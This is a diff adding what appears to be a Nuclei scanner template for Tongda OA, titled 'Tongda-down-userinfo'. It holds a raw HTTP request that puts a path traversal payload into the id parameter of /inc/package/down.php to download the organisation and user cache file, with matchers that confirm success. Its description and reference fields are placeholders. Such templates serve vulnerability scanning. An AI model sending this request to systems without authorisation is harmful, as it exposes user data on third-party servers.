@@ -1,0 +1,30 @@
+id: Tongda-down-userinfo
+info:
+  name: Tongda-down-userinfo
+  author: changge
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: Tongda
+requests:
+  - raw:
+      - |+
+        GET /inc/package/down.php?id=../../../cache/org HTTP/1.1
+        Host: {{Hostname}}
+
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - filename
+      - type: word
+        part: header
+        words:
+          - '200'
+      - type: status
+        status:
+          - 200
